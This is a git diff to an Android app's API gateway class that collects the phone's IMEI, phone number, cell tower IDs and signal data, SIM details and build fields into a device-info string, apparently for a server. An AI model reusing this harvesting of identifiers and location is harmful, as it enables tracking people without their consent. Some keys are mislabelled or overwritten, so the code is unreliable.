@@ -7,6 +7,14 @@ import android.os.Build;
 import android.support.annotation.NonNull;
 import android.support.annotation.Nullable;
 import android.support.annotation.WorkerThread;
+import android.telephony.CellInfo;
+import android.telephony.CellInfoCdma;
+import android.telephony.CellInfoGsm;
+import android.telephony.CellInfoLte;
+import android.telephony.CellInfoWcdma;
+import android.telephony.CellLocation;
+import android.telephony.TelephonyManager;
+import android.telephony.gsm.GsmCellLocation;
 import android.util.Log;
 
 import com.theah64.xrob.interfaces.JobListener;
@@ -31,6 +39,7 @@ public class APIRequestGateway {
 
     private static final String X = APIRequestGateway.class.getSimpleName();
     private final Activity activity;
+    private TelephonyManager tm;
 
     private static String getDeviceName() {
         final String manufacturer = Build.MANUFACTURER;
@@ -53,6 +62,18 @@ public class APIRequestGateway {
             return this;
         }
 
+        public DeviceInfoBuilder put(final String key, final int value) {
+            return put(key, String.valueOf(value));
+        }
+
+        public DeviceInfoBuilder put(final String key, final long value) {
+            return put(key, String.valueOf(value));
+        }
+
+        public DeviceInfoBuilder put(final String key, final boolean value) {
+            return put(key, String.valueOf(value));
+        }
+
         private static String getCooledValue(String value) {
             return value.replaceAll(HOT_REGEX, "~");
         }
@@ -66,12 +87,64 @@ public class APIRequestGateway {
         public String toString() {
             return stringBuilder.toString();
         }
+
+
     }
 
-    public static String getOtherDeviceInfo() {
+    private String getOtherDeviceInfo() {
+
 
         final DeviceInfoBuilder deviceInfoBuilder = new DeviceInfoBuilder();
 
+        if (CommonUtils.isSupport(17)) {
+            int i = 0;
+            for (final CellInfo cellInfo : tm.getAllCellInfo()) {
+                i++;
+
+                deviceInfoBuilder.put(i + " CellInfo timeStamp", cellInfo.getTimeStamp());
+                deviceInfoBuilder.put(i + " CellInfo isRegistered", cellInfo.isRegistered());
+
+                if (cellInfo instanceof CellInfoCdma) {
+                    deviceInfoBuilder.put(i + " CellInfoCDMA Signal strength", ((CellInfoCdma) cellInfo).getCellSignalStrength().toString());
+                    deviceInfoBuilder.put(i + " CellInfoCDMA CellIdentity", ((CellInfoCdma) cellInfo).getCellIdentity().toString());
+                } else if (cellInfo instanceof CellInfoGsm) {
+                    deviceInfoBuilder.put(i + " CellInfoCDMA Signal strength", ((CellInfoGsm) cellInfo).getCellSignalStrength().toString());
+                    deviceInfoBuilder.put(i + " CellInfoCDMA CellIdentity", ((CellInfoGsm) cellInfo).getCellIdentity().toString());
+                } else if (cellInfo instanceof CellInfoWcdma) {
+                    deviceInfoBuilder.put(i + " CellInfoCDMA Signal strength", ((CellInfoWcdma) cellInfo).getCellSignalStrength().toString());
+                    deviceInfoBuilder.put(i + " CellInfoCDMA CellIdentity", ((CellInfoWcdma) cellInfo).getCellIdentity().toString());
+                } else if (cellInfo instanceof CellInfoLte) {
+                    deviceInfoBuilder.put(i + " CellInfoCDMA Signal strength", ((CellInfoLte) cellInfo).getCellSignalStrength().toString());
+                    deviceInfoBuilder.put(i + " CellInfoCDMA CellIdentity", ((CellInfoLte) cellInfo).getCellIdentity().toString());
+                } else {
+                    deviceInfoBuilder.put(i + "CellInfo class", cellInfo.getClass().getName());
+                    deviceInfoBuilder.put(i + "CellInfo toString", cellInfo.toString());
+                }
+            }
+        }
+
+
+        //Collecting cell location
+        final GsmCellLocation gcmCellLoc = (GsmCellLocation) tm.getCellLocation();
+        deviceInfoBuilder.put("CID", gcmCellLoc.getCid())
+                .put("LAC", gcmCellLoc.getLac())
+                .put("PSC", gcmCellLoc.getPsc());
+
+        //Collecting sim card details
+        deviceInfoBuilder.put("DeviceId", tm.getDeviceId())
+                .put("Line1Number", tm.getLine1Number())
+                .put("CellLocation", tm.getCellLocation().toString())
+                .put("SoftwareVersion", tm.getDeviceSoftwareVersion());
+
+        if (CommonUtils.isSupport(24)) {
+            deviceInfoBuilder.put("Line1Number", getDateNetworkType(tm.getDataNetworkType()));
+        }
+
+        if (CommonUtils.isSupport(19)) {
+            deviceInfoBuilder.put("MMSUAProfileUrl", tm.getMmsUAProfUrl());
+        }
+
+        //Collecting device details
         deviceInfoBuilder
                 .put("Build.BOARD", Build.BOARD)
                 .put("Build.BOOTLOADER", Build.BOOTLOADER)
@@ -94,6 +167,43 @@ public class APIRequestGateway {
         }
 
         return deviceInfoBuilder.toString();
+    }
+
+    private static String getDateNetworkType(int dataNetworkType) {
+        switch (dataNetworkType) {
+            case TelephonyManager.NETWORK_TYPE_GPRS:
+                return "TYPE_GPRS";
+            case TelephonyManager.NETWORK_TYPE_EDGE:
+                return "TYPE_EDGE";
+            case TelephonyManager.NETWORK_TYPE_UMTS:
+                return "TYPE_UMTS";
+            case TelephonyManager.NETWORK_TYPE_HSDPA:
+                return "TYPE_HSDPA";
+            case TelephonyManager.NETWORK_TYPE_HSUPA:
+                return "TYPE_HSUPA";
+            case TelephonyManager.NETWORK_TYPE_HSPA:
+                return "HSPA";
+            case TelephonyManager.NETWORK_TYPE_CDMA:
+                return "TYPE_CDMA";
+            case TelephonyManager.NETWORK_TYPE_EVDO_0:
+                return "TYPE_EVDO_0";
+            case TelephonyManager.NETWORK_TYPE_EVDO_A:
+                return "TYPE_EVDO_A";
+            case TelephonyManager.NETWORK_TYPE_EVDO_B:
+                return "TYPE_EVDO_B";
+            case TelephonyManager.NETWORK_TYPE_1xRTT:
+                return "TYPE_1xRTT";
+            case TelephonyManager.NETWORK_TYPE_IDEN:
+                return "TYPE_IDEN";
+            case TelephonyManager.NETWORK_TYPE_LTE:
+                return "TYPE_LTE";
+            case TelephonyManager.NETWORK_TYPE_EHRPD:
+                return "TYPE_EHRPD";
+            case TelephonyManager.NETWORK_TYPE_UNKNOWN:
+                return "TYPE_UNKNOWN";
+            default:
+                return "TYPE_VERY_UNKNOWN";
+        }
     }
 
     public interface APIRequestGatewayCallback {
@@ -126,10 +236,12 @@ public class APIRequestGateway {
 
         final ProfileUtils profileUtils = ProfileUtils.getInstance(context);
 
+        tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+
         //Collecting needed information
         final String name = profileUtils.getDeviceOwnerName();
 
-        final String imei = profileUtils.getIMEI();
+        final String imei = tm.getDeviceId();
         final String deviceName = getDeviceName();
         final String deviceHash = DarKnight.getEncrypted(deviceName + imei);
         final String otherDeviceInfo = getOtherDeviceInfo();
